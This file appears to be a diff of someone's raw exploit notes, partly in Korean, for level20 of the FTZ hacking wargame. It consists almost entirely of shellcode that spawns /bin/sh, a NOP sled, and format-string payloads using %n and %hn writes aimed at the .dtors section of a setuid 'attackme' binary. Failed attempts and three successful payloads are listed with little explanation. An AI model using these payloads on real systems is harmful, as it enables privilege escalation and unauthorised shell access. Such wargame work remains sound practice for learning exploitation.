@@ -1,0 +1,71 @@
+export key=`python -c 'print "\x90"*512 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
+export key=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"`
+export key=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
+
+#shell code
+0xbffffa24
+
+#ret address 
+0xbffff8dc
+
+
+#payload
+python -c 'print "\xdc\xf8\xff\xbf" + "DONG" + "\xde\xf8\xff\xbf" + "%8x8x" + "%64008x" + "%n" + "%49151x" + "%n"'
+(python -c 'print "\xdc\xf8\xff\xbf" + "DONG" + "\xde\xf8\xff\xbf" + "%8x8x$64008x" + "%n" + "%49151" + "%n"'; cat)  | ./attackme
+(python -c 'print "\xdc\xf8\xff\xbf" + "DONG" + "\xde\xf8\xff\xbf" + "%8x8x" + "%64008x" + "%n" + "%49151x" + "%n"';cat)| ./tmp/test
+
+#실패한 payload
+python -c 'print "\xdc\xf8\xff\xbf" + "\xde\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"'
+
+(python -c 'print "\xfc\xf8\xff\xbf" + "\xfe\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+(python -c 'print "\xec\xf8\xff\xbf" + "\xee\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+(python -c 'print "\xdc\xf8\xff\xbf" + "\xde\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+(python -c 'print "\xcc\xf8\xff\xbf" + "\xce\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+(python -c 'print "\xbc\xf8\xff\xbf" + "\xbe\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+(python -c 'print "\xac\xf8\xff\xbf" + "\xae\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+(python -c 'print "\x9c\xf8\xff\xbf" + "\x9e\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+(python -c 'print "\x8c\xf8\xff\xbf" + "\x8e\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+(python -c 'print "\x7c\xf8\xff\xbf" + "\x7e\xf8\xff\xbf" + "%64028x" + "%4\$n" + "%49151x" + "%5\$n"';cat) | ./attackme
+
+
+버퍼를 이용한 공격은 실패 
+->버퍼의 주소를 구할 수 없다.
+----------------------------------------------------------------------
+#.dtors주소 (gcc버전에 따라 없을 수도 있고 있을 수도 있음)
+08049594+4
+
+[level20@ftz level20]$ readelf -S ./attackme | grep .dtors
+  [19] .dtors            PROGBITS        08049594 000594 000008 00  WA  0   0  4
+[level20@ftz level20]$ objdump -x ./attackme | grep .dtors
+ 18 .dtors        00000008  08049594  08049594  00000594  2**2
+08049594 l    d  .dtors	00000000              
+08049594 l     O .dtors	00000000              (null)
+08049598 l     O .dtors	00000000              (null)
+
+
+python -c 'print "\x98\x95\x04\x08" + "\x9a\x95\x04\x08" + "%64028x" + "%4\$n"'  + "%49151x" + "%5\$n"'
+
+python -c 'print "\x98\x95\x04\x08" + "\x9a\x95\x04\x08" + "%64028c" + "%4\$n" + "%49151c" + "%5\$n"'
+
+(python -c 'print "\x98\x95\x04\x08" + "\x9a\x95\x04\x08" + "%64028x" + "%4\$n" + "%50651x" + "%5\$n"';cat) | ./attackme
+
+
+
+#성공1
+export key=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"`
+(python -c 'print "DONG" + "\x98\x95\x04\x08" + "DONG" + "\x9a\x95\x04\x08" + "%8x%8x%8x" + "%64508x" + "%hn" + "%50139x" + "%hn"';cat) | ./attackme
+
+#성공2
+export key=`python -c 'print "\x90"*512 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
+(python -c 'print "DONG" + "\x98\x95\x04\x08" + "DONG" + "\x9a\x95\x04\x08" + "%8x%8x%8x" + "%63996x" + "%hn" + "%50651x" + "%hn"';cat) | ./attackme
+
+#성공3
+성공2의 앞 더미 문자열을 지움
+export key=`python -c 'print "\x90"*512 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
+(python -c 'print "\x98\x95\x04\x08" + "DONG" + "\x9a\x95\x04\x08" + "%8x%8x"+ "%64008x" + "%hn" + "%50651x" + "%hn"';cat) | ./attackme
+
+#도전
+export key=`python -c 'print "\x90"*512 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
+(python -c 'print "\x98\x95\x04\x08" + "\x9a\x95\x04\x08" + "%8x%8x"+ "%64028x" + "%4\$n" + "%50651x" + "%5\$n" ';cat) | ./attackme
+
+
